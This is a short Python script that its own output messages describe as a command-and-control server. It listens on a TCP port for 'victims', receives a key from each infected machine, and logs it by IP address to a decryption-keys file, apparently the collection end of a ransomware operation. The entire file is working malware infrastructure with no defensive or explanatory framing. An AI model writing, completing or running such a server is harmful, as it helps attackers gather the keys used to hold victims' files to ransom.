import socket

SERVER_IP = "0.0.0.0"
SERVER_PORT = 5555

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(1)
    
    print(f"[+] C2 Server Listening on port {SERVER_PORT}...")

    while True:
        client_socket, client_address = server.accept()
        print(f"[!] New Victim Connected: {client_address}")
        
        try:
            key = client_socket.recv(1024).decode()
            if key:
                with open("decryption_keys.txt", "a") as f:
                    f.write(f"{client_address[0]}: {key}\n")
                print(f"[V] Key saved! {key}")
                client_socket.send("ACK".encode())
        except Exception as e:
            print(f"[X] Error receiving key: {e}")
        
        client_socket.close()

if __name__ == "__main__":
    start_server()
